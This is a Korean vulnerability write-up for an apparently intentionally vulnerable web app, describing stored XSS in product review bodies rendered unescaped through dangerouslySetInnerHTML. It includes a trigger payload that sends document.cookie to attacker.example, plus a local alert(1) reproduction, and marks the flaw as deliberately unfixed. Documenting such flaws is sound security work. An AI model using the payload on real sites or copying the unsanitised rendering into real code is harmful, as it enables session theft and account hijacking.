# VULN-008 상품 리뷰 본문 저장형 XSS

- 대상 스택: node-express, java-spring (client 공통)
- 심각도: High
- 분류: A05:2025 Injection (XSS)

## 위치

`apps/client/src/pages/ProductDetail.jsx` — 리뷰 목록 렌더링 시 `r.body`를 이스케이프 없이 `dangerouslySetInnerHTML`로 주입. 백엔드(Node `POST /api/products/:id/reviews`, Java `ProductController.createReview`) 모두 리뷰 본문에 대한 검증/새니타이즈가 없어 저장된 그대로 다른 사용자에게 렌더링됨.

## 트리거 방법

```
POST /api/products/1/reviews
{"rating":5,"body":"<img src=x onerror=fetch('https://attacker.example/c?c='+document.cookie)>"}
```

해당 상품 상세 페이지를 조회하는 모든 사용자(관리자 포함)의 브라우저에서 스크립트 실행.

## 영향

- 세션 쿠키/토큰 탈취, 관리자 세션 하이재킹, 임의 API 호출(피해자 권한으로) 등.

## 증거 (재현 확인)

2026-09-01, 로컬 재현(`:8090`, `user1`): `POST /api/node/products/1/reviews {"rating":5,"body":"<img src=x onerror=alert(1)>"}` → 저장 후 `GET /products/1/reviews` 응답에 `body`가 이스케이프 없이 그대로 반환됨. 상품 상세(`ProductDetail.jsx:277`)가 `dangerouslySetInnerHTML`로 렌더하므로 열람자 브라우저에서 `onerror` 실행. (bare `<script>`는 innerHTML에서 실행 안 되므로 `img/onerror` 사용.)

## 조치 상태: 미조치 (의도된 취약점)
